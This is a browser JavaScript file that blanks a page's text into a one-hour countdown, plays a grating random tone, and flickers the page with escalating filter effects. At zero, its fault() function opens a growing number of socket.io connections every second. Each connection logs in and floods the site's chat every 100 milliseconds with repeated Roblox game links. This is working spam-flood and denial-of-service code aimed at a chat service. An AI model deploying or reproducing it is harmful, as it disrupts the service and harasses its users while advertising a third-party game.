let countdown = 3600;

// Select all elements normally
const elementsToUpdate = document.querySelectorAll("span, h1, h2, h3, h4, marquee, a, div");

// Filter divs to only include those that contain **text nodes directly**
const filteredElements = Array.from(elementsToUpdate).filter(el => {
    if (el.tagName.toLowerCase() === 'div') {
        return Array.from(el.childNodes).some(node => node.nodeType === Node.TEXT_NODE && node.textContent.trim() !== '');
    }
    return true;
});

// Audio setup
const audioCtx = new (window.AudioContext || window.webkitAudioContext)({sampleRate: 4000});
const oscillator = audioCtx.createOscillator();
oscillator.type = 'square';
oscillator.connect(audioCtx.destination);

// Frequency randomization parameters
let fk = 1.0;

// Change frequency with escalating chaos
function changeFrequency() {
    const freq = Math.random() * (150 - 75) + 75;
    oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);

    // Always grayscale
    let contrast = 1;
    let brightness = 1;

    if (countdown > 30) {
        fk = Math.max(fk - 0.005, 0.05);
    } else if (countdown <= 30 && countdown > 10) {
        fk = Math.max(fk - 0.02, 0.01);
        contrast = 1 + Math.random() * 0.5;
    } else {
        fk = Math.max(fk - 0.05, 0.001);
        contrast = 1 + Math.random() * 1.0;
        brightness = 0.5 + Math.random() * 0.5;
    }

    document.body.style.filter = `grayscale(100%) contrast(${contrast}) brightness(${brightness})`;

    const nextChange = Math.random() * (fk - 0.001) + 0.001;
    setTimeout(changeFrequency, nextChange * 1000);
}

function fault(){
  setInterval(() => {
    const socket = io("//");
    const sockett = io("//");
    sockett.emit("client", "MAIN");
    socket.emit("client", "MAIN");
    socket.emit("login", {
        name: "https://www.roblox.com/games/90615328924675/Maze",
        room: Math.floor(Math.random() * 100)
    });
    socket.emit("login", {
        name: "https://www.roblox.com/games/90615328924675/Maze"
    });
  setInterval(() => {
      socket.emit("command", {
          list: ["color"]
      });
      socket.emit("talk", {
          text: "https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze " + Math.random() * 100000000000000000000
      });
      sockett.emit("command", {
          list: ["color"]
      });
      sockett.emit("talk", {
          text: "https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze https://www.roblox.com/games/90615328924675/Maze " + Math.random() * 100000000000000000000
      });
  }, 100)
}, 1000)
}

// Countdown display
const countdownInterval = setInterval(() => {
    countdown--;

    filteredElements.forEach(element => {
        element.textContent = countdown;
    });

    if (countdown <= 0) {
        clearInterval(countdownInterval);
        oscillator.stop();
        fault()
    }
}, 1000);

// Start
oscillator.start();
changeFrequency();
